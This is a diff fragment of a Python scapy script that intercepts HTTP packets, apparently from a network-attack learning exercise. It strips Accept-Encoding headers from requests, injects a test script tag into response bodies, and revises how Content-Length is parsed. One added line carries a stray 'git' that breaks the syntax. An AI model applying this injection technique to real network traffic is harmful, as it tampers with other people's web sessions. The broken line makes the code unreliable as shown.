@@ -18,7 +18,7 @@ def process_packet(packet):
         load = scapy_packet.hasLayer(scapy.Raw).load
 #check packets destination port for 80 (http) REQUESTS
         if scapy_packet[scapy.TCP].dport == 80:
-            print("[+] Request")
+            print("[+] Request")git
 #regex to replace the first arg with a empty string
             load = re.sub("Accept-Encoding:.*?\\r\\n", "", load)
 #check packets source port for 80 (http) RESPONSES
@@ -26,9 +26,10 @@ def process_packet(packet):
             print("[+] Response")
 #in the captured packet replace the body in the load field with a script
             load = load.replace("</body>", "<script>alert('test');</script></body>")
-#use regex to search for Content-Length in entire packet
-            content_length_search = re.search("Content-Length:\s\d*", load)
+#use regex to search for Content-Length in entire packet; ?: will search for item but not return it
+            content_length_search = re.search("(?:Content-Length:\s)(\d*)", load)
             if content_length_search:
+#group(0) matches first item from entire str
                 content_length = content_length_search.group(0)
                 print(content_length)
 #if state if load is not the same as the scapy packet Raw layer load then modify the packet
